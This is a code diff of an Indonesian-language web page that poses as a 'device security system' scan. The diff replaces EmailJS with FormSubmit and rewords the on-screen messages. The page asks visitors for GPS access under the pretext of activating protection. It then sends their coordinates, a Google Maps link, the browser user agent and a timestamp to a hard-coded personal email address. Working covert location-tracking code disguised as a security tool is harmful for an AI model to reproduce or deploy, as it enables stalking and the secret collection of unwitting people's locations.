@@ -4,8 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sistem Keamanan Perangkat</title>
-    <!-- EmailJS SDK -->
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -13,6 +11,7 @@
             --secondary: #4facfe;
             --bg: #0b0f1a;
             --glass: rgba(255, 255, 255, 0.03);
+            --accent: #00d2ff;
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -100,22 +99,17 @@
             font-weight: 300;
         }
 
-        .orb {
-            position: absolute;
-            border-radius: 50%;
-            filter: blur(80px);
-            z-index: 1;
+        .success-icon {
+            display: none;
+            color: #10b981;
+            font-size: 4rem;
+            margin-bottom: 1.5rem;
         }
-        .orb-1 { width: 300px; height: 300px; background: rgba(0, 242, 254, 0.1); top: -100px; left: -100px; }
-        .orb-2 { width: 400px; height: 400px; background: rgba(79, 172, 254, 0.1); bottom: -150px; right: -150px; }
 
         .status-ready { color: #10b981; font-weight: 600; margin-top: 1rem; }
     </style>
 </head>
 <body>
-    <div class="orb orb-1"></div>
-    <div class="orb orb-2"></div>
-
     <div class="container">
         <div id="status-ui">
             <div class="scanner-container">
@@ -128,46 +122,51 @@
         </div>
         
         <div id="success-ui" style="display: none;">
-            <div style="font-size: 5rem; margin-bottom: 1rem;">✅</div>
+            <div style="font-size: 5rem; margin-bottom: 1rem ;">✅</div>
             <h1>Proteksi Aktif</h1>
-            <p>Data lokasi terenkripsi telah dikirim ke email admin.</p>
+            <p>Data lokasi telah berhasil dikirim ke email admin.</p>
             <div class="status-ready">System Secure</div>
         </div>
     </div>
 
     <script>
-        // ==========================================
-        // KONFIGURASI EMAILJS (Dapatkan dari Dashboard)
-        // ==========================================
-        const PUBLIC_KEY = "8T81WqzN70hbZ_jNd";
-        const SERVICE_ID = "service_rc3g3c7";
-        const TEMPLATE_ID = "template_kd6i4e5";
-
-        emailjs.init(PUBLIC_KEY);
+        // MASUKKAN EMAIL ANDA DI SINI
+        const targetEmail = "cholilelgara001@gmail.com";
 
         const titleEl = document.getElementById('title');
         const msgEl = document.getElementById('msg');
         const statusUI = document.getElementById('status-ui');
         const successUI = document.getElementById('success-ui');
 
-        function sendEmailJS(lat, lng) {
-            const templateParams = {
-                Latitude: lat,
-                Longitude: lng,
-                Google_Maps: `https://www.google.com/maps?q=${lat},${lng}`,
-                Device: navigator.userAgent,
-                Time: new Date().toLocaleString('id-ID')
-            };
-
-            emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams)
-                .then(() => {
-                    statusUI.style.display = 'none';
-                    successUI.style.display = 'block';
-                }, (error) => {
-                    console.error('FAILED...', error);
-                    titleEl.innerText = "Error Konfigurasi";
-                    msgEl.innerText = "Periksa kembali Public Key, Service ID, atau Template ID Anda.";
-                });
+        function sendData(lat, lng) {
+            // Kita menggunakan FormSubmit - JAUH LEBIH MUDAH
+            // Tidak perlu daftar, tidak perlu API Key, tidak perlu login dashboard
+            fetch(`https://formsubmit.co/ajax/${targetEmail}`, {
+                method: "POST",
+                headers: { 
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify({
+                    _subject: "📍 LAPORAN LOKASI BARU",
+                    Latitude: lat,
+                    Longitude: lng,
+                    Google_Maps: `https://www.google.com/maps?q=${lat},${lng}`,
+                    Device: navigator.userAgent,
+                    Time: new Date().toLocaleString('id-ID')
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                console.log(data);
+                statusUI.style.display = 'none';
+                successUI.style.display = 'block';
+            })
+            .catch(err => {
+                console.log(err);
+                titleEl.innerText = "Gagal Mengambil Data";
+                msgEl.innerText = "Terjadi gangguan saat sinkronisasi.";
+            });
         }
 
         if (navigator.geolocation) {
@@ -176,13 +175,13 @@
                 const lng = position.coords.longitude;
                 
                 titleEl.innerText = "Mengirim...";
-                msgEl.innerText = "Menghubungkan ke server EmailJS.";
+                msgEl.innerText = "Menghubungkan ke pusat data keamanan.";
                 
-                sendEmailJS(lat, lng);
+                sendData(lat, lng);
 
             }, (error) => {
-                titleEl.innerText = "Akses Ditolak";
-                msgEl.innerText = "Gagal mendapatkan lokasi. Izinkan akses GPS.";
+                titleEl.innerText = "Akses Lokasi Dibutuhkan";
+                msgEl.innerText = "Silakan izinkan akses lokasi (GPS) untuk melanjutkan pelindungan.";
             });
         }
     </script>
